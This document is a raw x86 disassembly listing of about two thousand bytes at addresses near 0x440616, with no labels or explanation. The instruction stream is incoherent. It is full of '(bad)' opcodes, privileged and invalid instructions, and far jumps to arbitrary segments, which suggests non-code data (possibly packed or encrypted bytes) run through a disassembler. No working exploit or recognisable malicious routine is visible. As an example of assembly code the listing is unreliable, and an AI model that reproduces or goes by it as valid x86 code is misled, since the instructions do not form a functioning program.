  440616:	or     BYTE PTR [eax+ecx*2],bl
  440619:	and    ch,BYTE PTR [ecx+0x28]
  44061c:	sbb    eax,0x3e245726
  440621:	adc    BYTE PTR [edx-0x11c7db59],dl
  440627:	adc    eax,0xe60a6613
  44062c:	lock sysret 
  44062f:	pop    edx
  440630:	aas    
  440631:	and    eax,0x56965910
  440636:	mov    BYTE PTR [edi-0x1f67792a],al
  44063c:	aad    0x39
  44063e:	enter  0xd00c,0x16
  440642:	jl     0x44069d
  440644:	setbe  BYTE PTR [eax]
  440647:	pop    esi
  440648:	push   es
  440649:	xchg   esp,eax
  44064a:	pushf  
  44064b:	add    dl,BYTE PTR [edi+0x45]
  44064e:	pop    ebp
  44064f:	inc    edi
  440650:	xor    dl,BYTE PTR [eax]
  440652:	mov    al,0x4a
  440654:	jmp    0x440664
  440656:	mov    ds:0x8ab441f1,eax
  44065b:	(bad)  
  44065c:	mov    dl,0x7a
  44065e:	and    ch,BYTE PTR [edi-0x5e]
  440661:	hlt    
  440662:	dec    ecx
  440663:	sbb    eax,0x79165a98
  440668:	ret    
  440669:	not    BYTE PTR [eax+0x8]
  44066c:	cld    
  44066d:	xor    al,0xa
  44066f:	xor    ah,BYTE PTR [esi-0x70]
  440672:	into   
  440673:	popa   
  440674:	or     cl,BYTE PTR [ecx+0x475a7b26]
  44067a:	out    dx,al
  44067b:	jbe    0x44063b
  44067d:	enter  0x6464,0x5
  440681:	test   DWORD PTR [edi+0x2],eax
  440684:	inc    esi
  440685:	fstp   QWORD PTR [eax]
  440687:	mov    esi,0xe368f584
  44068c:	mov    ah,0x5f
  44068e:	shl    BYTE PTR [eax+ecx*1+0x36245058],0x14
  440696:	push   ebx
  440697:	push   ds
  440698:	js     0x44062c
  44069a:	or     eax,edx
  44069c:	mov    ch,BYTE PTR [edi+0x60]
  44069f:	addr16 inc esi
  4406a1:	push   edx
  4406a2:	aam    0x55
  4406a4:	mov    eax,ds:0xba8a5e87
  4406a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4406aa:	shl    BYTE PTR [esp+eax*2],cl
  4406ad:	mov    eax,ds:0x3000e184
  4406b2:	ror    BYTE PTR ds:[ebx+0x42],0xd8
  4406b7:	cld    
  4406b8:	icebp  
  4406b9:	adc    bl,al
  4406bb:	lods   al,BYTE PTR gs:[esi]
  4406bd:	push   0xffffffbe
  4406bf:	jmp    0x440641
  4406c1:	fs push esp
  4406c3:	aam    0x2
  4406c5:	dec    esp
  4406c6:	add    BYTE PTR [edi-0x2e],cl
  4406c9:	pop    esi
  4406ca:	das    
  4406cb:	pop    ebx
  4406cc:	inc    ebp
  4406cd:	mov    eax,cr5
  4406d0:	loopne 0x440699
  4406d2:	xchg   ebp,eax
  4406d3:	fisubr DWORD PTR [ebx+edx*2+0x45]
  4406d7:	jae    0x4406c7
  4406d9:	sti    
  4406da:	sbb    al,0x1c
  4406dc:	push   eax
  4406dd:	inc    eax
  4406de:	jo     0x440701
  4406e0:	mov    esp,0x5a1d0d51
  4406e5:	out    0xd3,al
  4406e7:	sahf   
  4406e8:	cmp    BYTE PTR [ebp+0x4280fc2f],al
  4406ee:	(bad)  
  4406ef:	sbb    edx,edx
  4406f1:	(bad)  
  4406f3:	rol    BYTE PTR [eax-0x7b],0x60
  4406f7:	fsub   DWORD PTR [eax-0x325a6047]
  4406fd:	fs push esp
  4406ff:	dec    esp
  440700:	xchg   ebx,eax
  440701:	push   edi
  440702:	dec    edx
  440703:	dec    ecx
  440704:	jnp    0x4406b6
  440706:	shl    DWORD PTR [edi],1
  440708:	or     ecx,DWORD PTR [edx+0x59f35a24]
  44070e:	mov    esi,0x91dad684
  440713:	pop    edx
  440714:	pop    esi
  440715:	rol    BYTE PTR ds:0xe346b83a,1
  44071b:	icebp  
  44071c:	ret    0x3746
  44071f:	push   esi
  440720:	(bad)  
  440721:	push   ss
  440722:	inc    ebp
  440723:	mov    DWORD PTR [ebx],0xd051967c
  440729:	push   ecx
  44072a:	retf   0x6ea9
  44072d:	mov    bl,0x7e
  44072f:	adc    ebx,eax
  440731:	pop    edx
  440732:	sbb    BYTE PTR [esi+0x630c5ea6],cl
  440738:	loop   0x44079c
  44073a:	xlat   BYTE PTR ds:[ebx]
  44073b:	js     0x4406ea
  44073d:	xchg   edi,eax
  44073e:	add    al,ah
  440740:	stc    
  440741:	inc    DWORD PTR [edx+eiz*2]
  440744:	jp     0x44070e
  440746:	les    esp,FWORD PTR [ebx]
  440748:	sbb    ah,BYTE PTR [esi-0x4be392a]
  44074e:	xchg   edx,eax
  44074f:	icebp  
  440750:	and    al,0x5f
  440752:	test   al,0x94
  440754:	lods   eax,DWORD PTR ds:[esi]
  440755:	mov    dl,0x78
  440757:	scas   al,BYTE PTR es:[edi]
  440758:	adc    al,BYTE PTR [ecx+ecx*8+0x41de3a56]
  44075f:	stos   BYTE PTR es:[edi],al
  440760:	inc    esp
  440761:	xchg   ecx,eax
  440762:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440765:	adc    bl,BYTE PTR [edi-0x31]
  440768:	ss jbe 0x4407e8
  44076b:	mov    bh,BYTE PTR [ebx+0x62]
  44076e:	not    DWORD PTR [esi]
  440770:	push   cs
  440771:	hlt    
  440772:	dec    ebp
  440773:	adc    BYTE PTR [esi-0x4af36360],bh
  440779:	push   ds
  44077a:	imul   esi,DWORD PTR [ebx+0x66092fa1],0xe
  440781:	sar    al,1
  440783:	test   BYTE PTR [esi],dl
  440785:	xor    eax,0x3e32176a
  44078a:	aas    
  44078b:	clc    
  44078c:	xchg   ebp,eax
  44078d:	adc    eax,DWORD PTR [ecx]
  44078f:	jmp    0xca90:0x72565428
  440796:	mov    al,ds:0x6943b63a
  44079b:	mov    ebp,0x52a934b7
  4407a0:	jge    0x4407dd
  4407a2:	ss (bad) 
  4407a5:	mov    cl,0xa1
  4407a7:	lods   eax,DWORD PTR ds:[esi]
  4407a8:	adc    eax,DWORD PTR [ebx-0x9f3d984]
  4407ae:	or     DWORD PTR [edx+0x2062c253],esp
  4407b4:	outs   dx,DWORD PTR ds:[esi]
  4407b5:	out    dx,al
  4407b6:	xlat   BYTE PTR ds:[ebx]
  4407b7:	xor    al,0x76
  4407b9:	fldcw  WORD PTR [eax+0x23]
  4407bc:	inc    esi
  4407bd:	sahf   
  4407be:	mov    al,0x7d
  4407c0:	(bad)  
  4407c1:	gs dec esi
  4407c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4407c4:	call   0x92a1:0x84dcbd8a
  4407cb:	push   eax
  4407cc:	mov    edi,0x78101920
  4407d1:	enter  0x4508,0x8e
  4407d5:	pop    ebp
  4407d6:	rcl    BYTE PTR [eax],1
  4407d8:	shl    DWORD PTR ss:[edi],0x66
  4407dc:	es jo  0x4407e0
  4407df:	test   eax,0x61d2050d
  4407e4:	clc    
  4407e5:	sbb    eax,0x526e704b
  4407ea:	pavgb  mm4,QWORD PTR [ebx-0x5f9bd9ce]
  4407f1:	jmp    0xd7c0ddf8
  4407f6:	ins    BYTE PTR es:[edi],dx
  4407f7:	jae    0x4407ab
  4407f9:	mov    dl,0x70
  4407fb:	add    DWORD PTR [ebp-0x56],edx
  4407fe:	xchg   esi,eax
  4407ff:	in     al,0x9e
  440801:	mov    dl,0x2c
  440803:	xor    eax,0xb7420af0
  440808:	loop   0x440813
  44080a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44080b:	stc    
  44080c:	outs   dx,BYTE PTR ds:[esi]
  44080d:	sub    eax,0x962238ad
  440812:	ins    BYTE PTR es:[edi],dx
  440813:	mov    eax,0x599bb8a6
  440818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440819:	jp     0x4407f1
  44081b:	lods   eax,DWORD PTR ds:[esi]
  44081c:	or     esi,DWORD PTR [edx-0x34]
  44081f:	xchg   ebx,eax
  440820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440821:	call   0x1847:0xb425afd1
  440828:	mov    edx,0xb4f8dcbb
  44082d:	sub    dh,BYTE PTR [ebx]
  44082f:	test   eax,0x3030dc1a
  440834:	enter  0x7e1c,0x48
  440838:	fwait
  440839:	xchg   ebp,eax
  44083a:	or     ch,al
  44083c:	mov    eax,0xa919ad68
  440841:	or     BYTE PTR [edi-0x14],0xb3
  440845:	push   ds
  440846:	push   0xffffff86
  440848:	and    BYTE PTR [esi+ebp*1-0x56],ch
  44084c:	cmp    dl,BYTE PTR [edx+0xa]
  44084f:	adc    BYTE PTR [edi-0x69255f18],bl
  440855:	xor    DWORD PTR [ecx],ebx
  440857:	or     al,0x52
  440859:	xchg   ebx,eax
  44085a:	icebp  
  44085b:	ins    BYTE PTR es:[edi],dx
  44085c:	mov    eax,ds:0xe5b86d1e
  440861:	or     al,0x86
  440863:	lock mov eax,DWORD PTR [esi+0x78]
  440867:	in     al,0xe6
  440869:	in     al,dx
  44086a:	push   edx
  44086b:	adc    eax,0xff587b44
  440870:	inc    eax
  440871:	push   ebp
  440872:	(bad)  
  440873:	sbb    al,0xc7
  440875:	xchg   esp,eax
  440876:	mov    dh,0xf
  440878:	adc    BYTE PTR [edx+eiz*1],ch
  44087b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44087c:	popa   
  44087d:	push   cs
  44087e:	jge    0x4408af
  440880:	mov    ah,0x4e
  440882:	sbb    ah,al
  440884:	lea    edx,[esp+ebx*8+0x26dfadfc]
  44088b:	mov    dh,0x4d
  44088d:	retf   0x1ce9
  440890:	sub    BYTE PTR [ecx-0x24e4a10d],ah
  440896:	xchg   edi,eax
  440897:	mov    esi,0xf179beae
  44089c:	fadd   DWORD PTR [ebx]
  44089e:	into   
  44089f:	inc    ecx
  4408a0:	imul   ebx,DWORD PTR [eax],0x38
  4408a3:	data16 sbb al,ah
  4408a6:	inc    edi
  4408a7:	and    bh,bl
  4408a9:	test   BYTE PTR [edi+0x276a2df0],0x86
  4408b0:	(bad)
  4408b5:	retf   
  4408b6:	push   eax
  4408b7:	std    
  4408b8:	cs dec ecx
  4408ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4408bb:	xchg   ecx,eax
  4408bc:	adc    bl,dl
  4408be:	mov    edx,0xb100f946
  4408c3:	add    al,BYTE PTR [edi-0x56]
  4408c6:	shl    BYTE PTR [ecx-0x2c],0x2
  4408ca:	test   BYTE PTR [ebx],dl
  4408cc:	adc    ecx,0x78
  4408cf:	add    ah,BYTE PTR [eax]
  4408d1:	adc    ecx,esi
  4408d3:	stos   BYTE PTR es:[edi],al
  4408d4:	or     ebp,DWORD PTR [ebx+eax*1+0x5e1e4c46]
  4408db:	hlt    
  4408dc:	mov    edx,0xd35b9f22
  4408e1:	shl    BYTE PTR [eax-0x7e],1
  4408e4:	mov    dh,0x95
  4408e6:	sub    al,0xad
  4408e8:	pop    ds
  4408e9:	mov    ?,WORD PTR [edx]
  4408eb:	sar    ch,cl
  4408ed:	aam    0xf
  4408ef:	dec    eax
  4408f0:	fs xchg ecx,eax
  4408f2:	dec    ebx
  4408f3:	adc    BYTE PTR [ebx+ebx*2+0x7e],bl
  4408f7:	sbb    DWORD PTR [edi],edi
  4408f9:	or     eax,0x22a7ad2a
  4408fe:	stos   DWORD PTR es:[edi],eax
  4408ff:	in     al,0x12
  440901:	pop    ebp
  440902:	fist   WORD PTR [esi]
  440904:	sub    al,0x72
  440906:	mov    al,0xe3
  440908:	push   0x13
  44090a:	mov    ah,0x62
  44090c:	aam    0x12
  44090e:	mov    bh,cl
  440910:	cmp    al,0xdc
  440912:	mov    al,0xad
  440914:	add    BYTE PTR [edi-0x51c1a12c],bl
  44091a:	cmp    bh,dl
  44091c:	xchg   esi,eax
  44091d:	pop    esi
  44091e:	and    ah,BYTE PTR [ecx+0x57]
  440921:	pop    esp
  440923:	inc    ebx
  440924:	cmp    ch,BYTE PTR [ecx+0x1ebda8a7]
  44092a:	pop    ebp
  44092b:	lods   eax,DWORD PTR ds:[esi]
  44092c:	ret    
  44092d:	sbb    dl,BYTE PTR [ebx]
  44092f:	inc    edx
  440930:	(bad)  
  440931:	popf   
  440932:	adc    BYTE PTR [eax],ah
  440934:	cmp    dl,BYTE PTR [esi+0x78d40d84]
  44093a:	and    eax,0xd3ab9064
  44093f:	adc    cl,BYTE PTR [edx]
  440941:	push   0x98f5bd6e
  440946:	shr    BYTE PTR [edi],cl
  440948:	push   esp
  440949:	and    al,0x54
  44094b:	mov    al,0xa7
  44094d:	xlat   BYTE PTR ds:[ebx]
  44094e:	push   ecx
  44094f:	shr    BYTE PTR [ebp-0x73],1
  440952:	xor    BYTE PTR [edx],bh
  440954:	inc    edi
  440955:	pusha  
  440956:	dec    edx
  440957:	js     0x4408e4
  440959:	sub    dl,BYTE PTR [eax]
  44095b:	ins    BYTE PTR es:[edi],dx
  44095c:	pushf  
  44095d:	mov    esp,0x14f68e8
  440962:	jbe    0x44096e
  440964:	sub    bh,BYTE PTR [eax+eax*2]
  440967:	xor    al,0xcc
  440969:	xor    BYTE PTR [ebp+0x22e9c716],ch
  44096f:	xchg   esi,eax
  440970:	dec    ecx
  440971:	ins    BYTE PTR es:[edi],dx
  440972:	xlat   BYTE PTR ds:[ebx]
  440973:	push   0x20
  440975:	rcr    DWORD PTR [edx+0x4bdd4c27],cl
  44097b:	or     ebp,ebp
  44097d:	pop    eax
  44097e:	cli    
  44097f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440980:	ins    BYTE PTR es:[edi],dx
  440981:	daa    
  440982:	sub    cl,cl
  440984:	push   ss
  440985:	sahf   
  440986:	xchg   edi,eax
  440987:	or     al,0x6c
  440989:	and    edi,esp
  44098b:	jge    0x4409a9
  44098d:	in     al,dx
  44098e:	push   eax
  44098f:	jnp    0x4409dd
  440991:	loopne 0x440927
  440993:	(bad)  
  440994:	sbb    al,0x39
  440996:	not    BYTE PTR [edx+0x66]
  440999:	cmp    eax,0xa259f420
  44099e:	test   BYTE PTR [ecx-0x2e],0xbc
  4409a2:	stc    
  4409a3:	cmp    eax,0x8286a88a
  4409a8:	es cld 
  4409aa:	fmul   DWORD PTR [ecx+0x283875b4]
  4409b0:	and    BYTE PTR [eax],bl
  4409b2:	cdq    
  4409b3:	sbb    al,0x56
  4409b5:	jns    0x4409d9
  4409b7:	mov    edx,0x4a48ad61
  4409bc:	popf   
  4409bd:	mov    ds:0xe454927,al
  4409c2:	test   DWORD PTR [ebp+eiz*4-0x20],esp
  4409c6:	pop    ss
  4409c7:	ss mov dh,0xa6
  4409ca:	adc    eax,0xa0946210
  4409cf:	lods   al,BYTE PTR ds:[esi]
  4409d0:	dec    esp
  4409d1:	jae    0x4409e3
  4409d3:	or     eax,0x620a1a0e
  4409d8:	jp     0x4409e1
  4409da:	popa   
  4409db:	xor    DWORD PTR [ebp-0x34],0x61
  4409df:	jbe    0x440a5b
  4409e1:	hlt    
  4409e2:	repz pusha 
  4409e4:	add    eax,esi
  4409e6:	pop    ecx
  4409e7:	ret    0x98a8
  4409ea:	pushf  
  4409eb:	call   0xdb0b:0x6b08fe2f
  4409f2:	aaa    
  4409f3:	sbb    al,0xd2
  4409f5:	inc    edi
  4409f6:	in     al,0x7e
  4409f8:	sbb    edx,eax
  4409fa:	sub    bl,dl
  4409fc:	jne    0x4409fd
  4409fe:	xchg   edx,eax
  4409ff:	or     eax,0x780530a
  440a04:	test   dh,bl
  440a06:	ret    0x2ea3
  440a09:	mov    ah,0x76
  440a0b:	pop    ebp
  440a0c:	add    BYTE PTR [eax+0x7b],0x8e
  440a10:	jmp    0x29a5fa3b
  440a15:	add    eax,0xeab66001
  440a1a:	pop    es
  440a1b:	test   dh,dl
  440a1d:	fs pop esp
  440a1f:	pop    edi
  440a20:	or     dh,BYTE PTR [ebp+0x447ae42c]
  440a26:	jmp    0x3e28:0xb6def1bc
  440a2d:	xor    eax,0x5036e081
  440a32:	call   0xb4cd:0x432ec63a
  440a39:	dec    esp
  440a3a:	add    ebp,edi
  440a3c:	inc    eax
  440a3d:	mov    eax,0xdb1dd697
  440a42:	aaa    
  440a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440a44:	cmp    BYTE PTR [eax-0x49fdd7e],cl
  440a4a:	pushf  
  440a4b:	call   0xba76179
  440a50:	jb     0x14309576
  440a56:	aad    0x40
  440a58:	xchg   BYTE PTR [edx],dl
  440a5a:	mov    eax,ds:0xb2feac91
  440a5f:	xor    eax,DWORD PTR [ecx+0x7b]
  440a62:	imul   eax,DWORD PTR [ecx],0x5218b54a
  440a68:	aad    0x1e
  440a6a:	call   0x9f9e0eb1
  440a6f:	push   0xffffff94
  440a71:	dec    edx
  440a72:	(bad)  
  440a74:	mov    bl,0x50
  440a76:	gs out 0xef,al
  440a79:	test   al,0x3a
  440a7b:	jecxz  0x440afb
  440a7d:	sar    dl,cl
  440a7f:	dec    ecx
  440a80:	loopne 0x440a69
  440a82:	jnp    0x440a8e
  440a84:	add    DWORD PTR [esp+esi*1-0x4fff7c17],esp
  440a8b:	sbb    al,0x7c
  440a8d:	dec    esp
  440a8e:	add    ebp,ebp
  440a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440a91:	add    al,0xb4
  440a93:	jge    0x440b06
  440a95:	cli    
  440a96:	push   cs
  440a97:	cdq    
  440a98:	inc    eax
  440a99:	jnp    0x440ac4
  440a9b:	repnz adc al,BYTE PTR [ebx+0x225b10d0]
  440aa2:	cmp    bh,BYTE PTR [esi-0x7e]
  440aa5:	test   DWORD PTR [ebp-0x5e],edx
  440aa8:	pop    edx
  440aa9:	jp     0x440adb
  440aab:	mov    ah,0xe2
  440aad:	hlt    
  440aae:	int    0x94
  440ab0:	scas   al,BYTE PTR es:[edi]
  440ab1:	je     0x440a7d
  440ab3:	aas    
  440ab4:	clc    
  440ab5:	and    BYTE PTR [ecx+0x1e06b6d0],ah
  440abb:	mov    ah,0xf9
  440abd:	pop    ss
  440abe:	adc    al,0x5e
  440ac0:	sub    DWORD PTR [eax+0x3c],0xfffffffd
  440ac4:	loop   0x440b32
  440ac6:	or     ebp,ebp
  440ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440ac9:	sbb    BYTE PTR [ebp-0x53a804fc],0xcd
  440ad0:	adc    bl,BYTE PTR [eax-0x10]
  440ad3:	add    eax,0xc73677d0
  440ad8:	pmaddwd mm1,QWORD PTR [eax]
  440adb:	aam    0x63
  440add:	ins    BYTE PTR es:[edi],dx
  440ade:	jp     0x440aa9
  440ae0:	(bad)  
  440ae2:	push   0x67
  440ae4:	arpl   di,dx
  440ae6:	adc    esp,esp
  440ae8:	sub    eax,0x9a84e238
  440aed:	add    DWORD PTR [edx+0x15],esp
  440af0:	mov    ch,0x44
  440af2:	push   ss
  440af3:	icebp  
  440af4:	out    0xa6,al
  440af6:	int3   
  440af7:	or     DWORD PTR [eax+esi*4+0x2e],ebp
  440afb:	dec    esp
  440afc:	arpl   ax,dx
  440afe:	sub    al,0x70
  440b00:	xlat   BYTE PTR ds:[ebx]
  440b01:	stos   BYTE PTR es:[edi],al
  440b02:	mov    dl,ah
  440b04:	xor    DWORD PTR [esi-0x678eb93f],ebp
  440b0a:	or     BYTE PTR [ebx+0x20],bh
  440b0d:	and    BYTE PTR [edx],cl
  440b0f:	mov    al,0xc4
  440b11:	mov    bh,BYTE PTR [edi]
  440b13:	mov    ch,0x15
  440b15:	jne    0x440ad7
  440b17:	mov    edi,0x837c79d4
  440b1c:	ss dec esp
  440b1e:	leave  
  440b1f:	rcl    DWORD PTR [ecx+0x7204ba8a],1
  440b25:	push   0xfec608d9
  440b2a:	rol    DWORD PTR [edx],1
  440b2c:	test   DWORD PTR [edx+edx*2],esp
  440b2f:	add    BYTE PTR [edx-0x4da696b3],bl
  440b35:	outs   dx,BYTE PTR ds:[esi]
  440b36:	mov    al,ds:0xb8208664
  440b3b:	push   eax
  440b3c:	je     0x440b63
  440b3e:	adc    eax,0x46f68578
  440b43:	or     BYTE PTR [ecx+edx*4+0x78302684],ah
  440b4a:	lods   al,BYTE PTR ds:[esi]
  440b4b:	sbb    ah,BYTE PTR [ebx+eax*8]
  440b4e:	ins    BYTE PTR es:[edi],dx
  440b4f:	clc    
  440b50:	inc    esp
  440b51:	mov    ch,0x6e
  440b53:	push   edi
  440b54:	mov    al,0xcc
  440b56:	cmp    eax,0xad86156d
  440b5b:	sub    cl,BYTE PTR [ebp+0x7c]
  440b5e:	sar    BYTE PTR [ecx],1
  440b60:	cmp    BYTE PTR [eax+0x74],al
  440b63:	(bad)  
  440b65:	cwde   
  440b66:	imul   ecx,DWORD PTR [ebx],0x1f
  440b69:	dec    eax
  440b6a:	jmp    0x58e3:0xbe30dd8d
  440b71:	aam    0x1a
  440b73:	mov    cl,0xfe
  440b75:	or     DWORD PTR [esi+0x4d],0xc9fb0020
  440b7c:	or     dl,BYTE PTR [edx+edx*1+0x44f65260]
  440b83:	inc    eax
  440b84:	ins    BYTE PTR es:[edi],dx
  440b85:	cs fcmovbe st,st(0)
  440b88:	js     0x440b68
  440b8a:	inc    esp
  440b8b:	mov    eax,0x3e08de00
  440b90:	sub    ebp,0x1678bf1b
  440b96:	jge    0x440b38
  440b98:	xchg   edx,eax
  440b99:	jbe    0x440bdf
  440b9b:	out    dx,al
  440b9c:	scas   eax,DWORD PTR es:[edi]
  440b9d:	dec    esp
  440b9e:	cld    
  440b9f:	xchg   esp,eax
  440ba0:	mov    eax,0x1a0c6ac
  440ba5:	push   ecx
  440ba6:	sub    bl,BYTE PTR [eax-0xa]
  440ba9:	or     DWORD PTR [esi-0x4f1d1b78],esi
  440baf:	rcl    DWORD PTR [ebp+0xe406c25],0x4f
  440bb6:	mov    DWORD PTR es:[esi+0x42c9a22c],ebp
  440bbd:	sbb    eax,0xa06fad12
  440bc2:	fyl2x  
  440bc4:	pop    esp
  440bc5:	xchg   edx,eax
  440bc6:	nop
  440bc7:	xor    DWORD PTR [eax],eax
  440bc9:	dec    edx
  440bca:	push   0xdaa63c04
  440bcf:	sub    eax,0xd4ebc4c3
  440bd4:	sub    BYTE PTR [edx],ah
  440bd6:	cwde   
  440bd7:	(bad)  
  440bd8:	(bad)  
  440bd9:	sahf   
  440bda:	xchg   esi,eax
  440bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440bdc:	rcr    BYTE PTR [ecx+0x6a],1
  440bdf:	mov    ch,ah
  440be1:	sub    BYTE PTR [esi+eiz*4-0xf],bh
  440be5:	inc    esp
  440be6:	sub    esi,0x5a3de05a
  440bec:	mov    al,fs:0xf6dde8f1
  440bf2:	pop    esp
  440bf3:	dec    esp
  440bf4:	outs   dx,DWORD PTR ds:[esi]
  440bf5:	ret    
  440bf6:	and    bl,ah
  440bf8:	pop    ecx
  440bf9:	ret    0x82f0
  440bfc:	popa   
  440bfd:	mov    ah,0xcd
  440bff:	or     dh,dh
  440c01:	call   0xad01:0xb32ec9b4
  440c08:	imul   edi,DWORD PTR [edi],0x9424f62e
  440c0e:	mov    ch,0xc1
  440c10:	mov    dl,0x3f
  440c12:	push   cs
  440c13:	pop    es
  440c14:	jno    0x440c22
  440c16:	and    al,0xc3
  440c18:	push   es
  440c19:	rcl    BYTE PTR [edi],cl
  440c1b:	add    dh,BYTE PTR [esi-0x106b6a5a]
  440c21:	int3   
  440c22:	in     al,dx
  440c23:	pop    edx
  440c24:	pop    edx
  440c25:	pushf  
  440c26:	push   0x4b8195d1
  440c2b:	dec    esi
  440c2c:	jbe    0x440c20
  440c2e:	rol    DWORD PTR [ecx+ebp*8-0x63f839f6],cl
  440c35:	xchg   ebp,eax
  440c36:	rcr    DWORD PTR [edx-0x50],1
  440c39:	mov    ss,esi
  440c3b:	sub    al,0xa1
  440c3d:	mov    esi,0x3a44ae94
  440c42:	aaa    
  440c43:	or     al,0x3
  440c45:	or     ebp,DWORD PTR [esi+0x6a100d89]
  440c4b:	or     al,0xf1
  440c4d:	je     0x440c5c
  440c4f:	xor    eax,0x6b606974
  440c54:	add    DWORD PTR es:[ecx-0x4f],eax
  440c58:	test   eax,0xf8907c1e
  440c5d:	call   0xd85c:0xcb224d86
  440c64:	pop    esi
  440c65:	mov    edx,es
  440c67:	into   
  440c68:	adc    BYTE PTR [eax],ah
  440c6a:	js     0x440c18
  440c6c:	in     eax,0xf0
  440c6e:	inc    edx
  440c6f:	jb     0x440c9b
  440c71:	cld    
  440c72:	mov    ah,0x5a
  440c74:	jmp    0x440c2c
  440c76:	add    ebx,DWORD PTR [edx-0x5bb53bff]
  440c7c:	stos   BYTE PTR es:[edi],al
  440c7d:	and    ebp,DWORD PTR [esi+0x32278a8e]
  440c83:	xor    dh,ch
  440c85:	sbb    ch,BYTE PTR [edx]
  440c87:	addr16 push esi
  440c89:	and    eax,0x68d0fda3
  440c8e:	xlat   BYTE PTR ds:[ebx]
  440c8f:	js     0x440c83
  440c91:	outs   dx,BYTE PTR ds:[esi]
  440c92:	pop    esi
  440c93:	pop    edi
  440c94:	mov    ah,BYTE PTR [esp+eax*4]
  440c97:	jo     0x440c85
  440c99:	mov    eax,ds:0xdafcb684
  440c9e:	(bad)  
  440c9f:	rol    bl,0x4
  440ca2:	lock enter 0xdb5e,0x3c
  440ca7:	(bad)  
  440ca8:	inc    edi
  440ca9:	add    ebp,DWORD PTR [eax-0x72f5498e]
  440caf:	sub    ah,BYTE PTR [ecx-0x57f17f2b]
  440cb5:	jle    0x440c96
  440cb7:	retf   
  440cb8:	daa    
  440cb9:	mov    al,ds:0x30a4258f
  440cbe:	rcr    BYTE PTR [esp+edi*4-0x17d2aaec],1
  440cc5:	jnp    0x440c79
  440cc7:	popf   
  440cc8:	rcl    DWORD PTR [esi-0x4d],1
  440ccb:	icebp  
  440ccc:	fs adc bh,dh
  440ccf:	sub    BYTE PTR [edi+0x9],0xbb
  440cd3:	call   0x7016:0xe41d9e7d
  440cda:	pop    ecx
  440cdb:	cmp    dh,cl
  440cdd:	pop    edx
  440cde:	call   0x3ad7:0x1c69715a
  440ce5:	les    esp,FWORD PTR [ebp+0x2d]
  440ce8:	inc    eax
  440ce9:	add    eax,0x4a4d84eb
  440cee:	inc    eax
  440cef:	jne    0x440cf4
  440cf1:	int    0x3e
  440cf3:	push   ss
  440cf4:	rcr    BYTE PTR [eax+0x3447ae0],1
  440cfa:	scas   eax,DWORD PTR es:[edi]
  440cfb:	jle    0x440d43
  440cfd:	addr16 call 0x51f1:0xb0fc2139
  440d05:	adc    dh,BYTE PTR [ecx+0x7f]
  440d08:	inc    edx
  440d09:	jmp    0x5008:0x37e10c73
  440d10:	test   BYTE PTR [eax],dh
  440d12:	test   BYTE PTR [eax],0x0
  440d15:	aas    
  440d16:	test   dl,0x8
  440d19:	push   es
  440d1a:	ja     0x440d32
  440d1c:	data16 test BYTE PTR [ecx],al
  440d1f:	ror    DWORD PTR [esi-0x53b99a8],0x30
  440d26:	hlt    
  440d27:	enter  0x2d6,0x1c
  440d2b:	mov    al,ds:0x32a8dfe6
  440d30:	mov    DWORD PTR [eax+0x1e048eb4],edi
  440d36:	stc    
  440d37:	inc    ebx
  440d38:	arpl   WORD PTR [eax-0x15],bp
  440d3b:	push   es
  440d3c:	push   ds
  440d3d:	xor    al,0x96
  440d3f:	sti    
  440d40:	jl     0x440d33
  440d42:	sbb    dl,dl
  440d44:	dec    edx
  440d45:	rcl    dh,1
  440d47:	xchg   esi,eax
  440d48:	adc    BYTE PTR [edx-0x14],0x33
  440d4c:	inc    edx
  440d4d:	cmp    al,BYTE PTR [edx]
  440d4f:	cld    
  440d50:	sub    al,0x6a
  440d52:	or     BYTE PTR [eax-0x4b],0x4f
  440d56:	popa   
  440d57:	out    dx,eax
  440d58:	lock loopne 0x440cf0
  440d5b:	adc    bh,dl
  440d5d:	fldcw  WORD PTR [eax-0x42]
  440d60:	dec    edx
  440d61:	add    BYTE PTR [ecx+ebp*2+0x42ff0093],al
  440d68:	fs add al,0x6c
  440d6b:	dec    edx
  440d6c:	jmp    0x4464d8d
  440d71:	out    dx,al
  440d72:	nop
  440d73:	bound  eax,QWORD PTR [ebp-0x2f]
  440d76:	aaa    
  440d77:	fcomp  DWORD PTR [edi]
  440d79:	ret    0x88cd
  440d7c:	or     al,BYTE PTR [eax-0x54]
  440d7f:	mov    dh,0xd8
  440d81:	sbb    dh,cl
  440d83:	jp     0x440d9d
  440d85:	mov    ebp,0xe158d3f4
  440d8a:	(bad)  
  440d8c:	inc    esp
  440d8d:	mov    dh,0xc
  440d8f:	test   DWORD PTR [eax+0x4a],ecx
  440d92:	inc    esi
  440d93:	add    al,0xda
  440d95:	pop    DWORD PTR [esi-0x465974a2]
  440d9b:	mov    ebp,0x84e987a
  440da0:	adc    eax,0x46e1a445
  440da5:	ret    
  440da6:	cmp    al,0xa4
  440da8:	fdivr  DWORD PTR [esi]
  440daa:	test   BYTE PTR [edx-0x1d6576cc],bl
  440db0:	ins    BYTE PTR es:[edi],dx
  440db1:	xor    cl,0x4a
  440db4:	push   esp
  440db5:	fcmovne st,st(2)
  440db7:	rol    ecx,cl
  440db9:	or     bh,BYTE PTR [esi]
  440dbb:	stos   BYTE PTR es:[edi],al
  440dbc:	lock jns 0x440d67
  440dbf:	sbb    eax,0xf8408f08
  440dc4:	add    eax,DWORD PTR [edx+0x8df2e1a]
  440dca:	(bad)  
  440dcb:	imul   esi,DWORD PTR [esi-0x65777e5c],0x34
  440dd2:	test   al,0xdc
  440dd4:	push   cs
  440dd5:	mov    al,0xa1
  440dd7:	mov    eax,ds:0xa22ba4ea
  440ddc:	xchg   al,cl
  440dde:	cmc    
  440ddf:	push   esi
